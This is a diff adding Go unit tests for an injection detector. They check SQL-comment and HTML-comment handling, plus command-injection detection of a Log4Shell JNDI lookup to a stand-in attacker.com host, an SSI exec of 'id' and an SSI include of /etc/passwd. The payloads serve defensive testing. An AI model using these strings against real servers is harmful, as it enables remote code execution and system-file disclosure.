@@ -217,6 +217,17 @@ func TestDetectSQL_EmptyString(t *testing.T) {
 	}
 }
 
+func TestDetectSQL_HTMLCommentNotFlagged(t *testing.T) {
+	// The -- inside <!-- --> must not be flagged as a SQL comment.
+	if DetectSQL("<!-- TODO fix later -->") {
+		t.Error("HTML comment should not be flagged as SQL")
+	}
+	// A real trailing SQL comment is still detected.
+	if !DetectSQL("admin'-- ") {
+		t.Error("real trailing SQL comment should still be detected")
+	}
+}
+
 // ─── DetectPathTraversal tests ──────────────────────────────────────────────
 
 func TestDetectPathTraversal_Detects(t *testing.T) {
@@ -270,6 +281,23 @@ func TestDetectCommandInjection_SafeInput(t *testing.T) {
 func TestDetectCommandInjection_EmptyString(t *testing.T) {
 	if DetectCommandInjection("") {
 		t.Error("Empty string should return false")
+	}
+}
+
+func TestDetectCommandInjection_JNDIAndSSI(t *testing.T) {
+	attacks := []string{
+		"${jndi:ldap://attacker.com/a}",
+		`<!--#exec cmd="id"-->`,
+		`<!--#include virtual="/etc/passwd"-->`,
+	}
+	for _, input := range attacks {
+		if !DetectCommandInjection(input) {
+			t.Errorf("Should detect command injection: %q", input)
+		}
+	}
+	// A benign comment without an SSI directive keyword is not command injection.
+	if DetectCommandInjection("<!-- #note: see below -->") {
+		t.Error("benign comment should not be command injection")
 	}
 }
 
